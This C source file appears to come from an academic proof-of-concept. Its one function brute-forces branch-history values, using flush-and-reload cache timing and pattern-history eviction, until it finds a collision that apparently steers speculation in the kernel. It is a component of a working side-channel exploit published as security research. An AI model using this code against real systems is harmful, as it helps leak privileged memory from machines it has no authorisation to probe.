/*
 * Friday, October 27th 2023
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Alvise de Faveri Tron - a.de.faveri.tron@vu.nl
 * Herbert Bos - herbertb@cs.vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#include "flush_and_reload.h"
#include "targets.h"
#include "../../poc-common/common.h"

#include <sys/prctl.h>
#include <sys/ioctl.h>

#include <sys/time.h>
#include <sys/resource.h>
#include <string.h>


// ----------------------------------------------------------------------------
// Colliding history finding with a static target history
//
// ----------------------------------------------------------------------------


int find_colliding_history(struct config * cfg, uint8_t do_pht_eviction) {

    uint64_t hits = 0;
    uint64_t hits2 = 0;
    int iter = 0;

    set_load_chain_simple_touch(cfg, 1);

    cfg->reload_addr = cfg->fr_buf;

    // printf("%15s: 0x%016lx\n", "reload addr:", (uint64_t)cfg->reload_addr);
    // printf("%15s: 0x%016lx\n", "fr_buf:", (uint64_t)cfg->fr_buf);
    // printf("%15s: 0x%016lx\n", "fr_buf_kern:", (uint64_t)cfg->fr_buf_kern);
    // printf("%15s: 0x%016lx\n", "ind_map_kern:", (uint64_t)cfg->ind_map_kern);

    while(1) {
        iter++;
        if((iter % 1000) == 0){
            printf("\rTries: %d", iter);
            fflush(stdout);

        }

        // setup PHT eviction
        if (do_pht_eviction) {
            if(iter % 20000 == 0) {
                for (int i = 0; i < NUMBER_OF_EVICT_SETS; i++)
                {
                    randomize_branch_locations(cfg->all_pht_cfg[i], 0);
                }
            }

            cfg->pht_cfg = cfg->all_pht_cfg[iter % NUMBER_OF_EVICT_SETS];

        }


        // randomize history
        for(int i=0; i<MAX_HISTORY_SIZE; i++) cfg->history[i] = rand()&1;

        // do test
        hits = do_flush_and_reload(cfg, 5, 0);

        if(hits > 0) {

            printf("\n>> Found collision in %d tries (%ld/5 hits)\n", iter, hits);

            hits = do_flush_and_reload(cfg, 10000, 0);

            printf("   Verification: %ld/10000 hits\n", hits);

            if (hits < 100) {
                continue;
            }

            printf("History:\n");

            for(int i=0; i<MAX_HISTORY_SIZE; i++) {
                printf("%c", cfg->history[i]+'0');
            }

            printf("\n-------\n");

            break;

        }

    }

}

